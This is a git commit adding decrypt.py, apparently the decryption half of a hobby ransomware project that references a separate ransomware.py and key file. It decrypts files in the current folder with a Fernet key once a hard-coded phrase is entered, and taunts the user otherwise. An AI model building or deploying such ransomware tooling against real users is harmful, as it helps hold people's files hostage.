0927dec19bbabdbf633ca5099df193951ba8aa4b
Linus Lau <justinlinuslau@gmail.com>
2022-09-09 11:59:48 -0700

    first commit

---
+++ decrypt.py
@@ -0,0 +1,33 @@
+import os
+
+from cryptography.fernet import Fernet
+
+files = []
+
+for file in os.listdir():
+	if file == "ransomware.py" or file == "thekey.key" or file == "decrypt.py":
+		continue
+	if os.path.isfile(file):
+		files.append(file)
+
+print(files) 
+
+with open("thekey.key", "rb") as key:
+	secretkey = key.read()
+
+secretphrase = "wolfies"
+
+user_phrase = input("Enter the secret phrase to decrypt your files\n")
+
+if user_phrase == secretphrase: 
+	for file in files:
+		with open(file, "rb") as thefile:
+			contents = thefile.read()
+		contents_decrypted = Fernet(secretkey).decrypt(contents)
+		with open(file, "wb") as thefile: 
+			thefile.write(contents_decrypted)
+		print("Congrats, your're files are decrypted!")
+else:
+	print("Sorry, wrong password! All your files are still encrypted! >:D")
+
+
